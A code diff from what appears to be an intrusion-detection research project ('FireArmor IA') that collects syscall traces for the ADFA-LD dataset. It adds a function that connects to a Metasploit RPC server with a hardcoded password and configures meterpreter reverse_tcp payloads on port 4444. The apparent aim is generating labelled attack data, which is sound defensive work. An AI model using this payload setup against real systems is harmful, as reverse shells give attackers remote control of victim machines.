@@ -5,6 +5,7 @@ import psutil
 import os
 import multiprocessing
 import netifaces
+from pymetasploit3.msfrpc import MsfRpcClient
 
 
 
@@ -46,6 +47,7 @@ def get_syscall_from_ssh():
     output_file = 'output.txt'
     syscall_names_file_base = 'syscall_names.txt'
     csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
+    
 
     for i in range(20):
 
@@ -63,16 +65,37 @@ def get_syscall_from_ssh():
         replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))
 
 
+def get_syscall_from_Meterpreter():
+    client = MsfRpcClient('2GX4jkpm', port=55552)
+    payload_name = "linux/x86/meterpreter/reverse_tcp"
+    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
+    payload_file = "meterpreterPayload"
+
+    ip = get_my_ip()
+    print('your ip :', ip)
+
+    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+    payload['LHOST'] = ip
+    payload['LPORT'] = 4444
+    
+    payload = client.modules.use('payload', payload_name)
+    
+    replace_syscall_with_number('syscall_names.txt', csv_file, f'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
+    
 
 
 
-'''def get_syscall_from_Meterpreter():
+
+
+
+
+'''
+def get_syscall_from_Meterpreter():
     syscall_names_file_base = 'syscall_names.txt'
     payload = "meterpreterPayload"
     csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
     ip = get_my_ip()
     print('your ip :',ip)
-    kill_process_by_port(4444)
 
 
 
@@ -83,6 +106,7 @@ def get_syscall_from_ssh():
 
     payload_list_cpu = [None] * len(payload_list)
     for i in range(len(payload_list)):
+        kill_process_by_port(4444)
         payload_list_cpu[i] = payload_list[i].split('/')[1]
         print(payload_list_cpu[i])
 
@@ -103,20 +127,16 @@ def get_syscall_from_ssh():
         print("process1")
         process = subprocess.Popen(cmd3, shell=True)
 
+        time.sleep(10)
         # Exécuter la commande cmd4 dans un terminal
         print("process2")
         process = subprocess.Popen(cmd4, shell=True)
-        process.wait()
-        print("process3")
-        process.kill()
-
-
-
-        time.sleep(15)
+       
         
         replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-{i}.txt'.format(i=i))
 '''
 
+'''
 def get_syscall_from_Meterpreter():
     syscall_names_file_base = 'syscall_names.txt'
     payload = "meterpreterPayload"
@@ -144,12 +164,11 @@ def get_syscall_from_Meterpreter():
     # Exécuter la commande cmd4 dans un terminal
     print("process2")
     process2 = subprocess.Popen(cmd4, shell=True)
-        
-        
-        
-        
+    
+    time.sleep(20)
+            
     replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
-
+'''
 
 
 def replace_syscall_with_number(input_file, csv_file, output_file):
